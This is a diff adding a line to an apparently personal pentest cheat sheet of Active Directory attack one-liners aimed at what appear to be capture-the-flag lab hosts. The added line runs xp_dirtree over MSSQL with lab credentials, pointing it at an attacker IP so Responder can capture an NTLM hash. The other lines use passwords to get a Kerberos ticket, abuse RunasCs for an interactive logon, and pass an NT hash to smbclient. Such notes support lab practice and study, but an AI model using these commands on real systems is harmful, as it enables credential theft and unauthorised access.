@@ -1,5 +1,6 @@
 # CHEATSHEETS
 
+nxc mssql dc.sequel.htb -u PublicUser -p 'GuestUserCantWrite1' --local-auth -q "EXEC MASTER.sys.xp_dirtree '\\\\10.10.14.156\\test\\test', 1, 1"	# Get hash qith responder
 nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --generate-tgt Rosie	# generate kerberos ticket
 RunasCs.exe whatever whatever qwinsta -l 9	# Get session ID | Get interactive shell login type 9 |  type 9 logins it doesn’t actually check the creds, but I need to put something into those arguments
 smbclient -U Simon.Watson --pw-nt-hash //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50	# smbcliente connect with hash
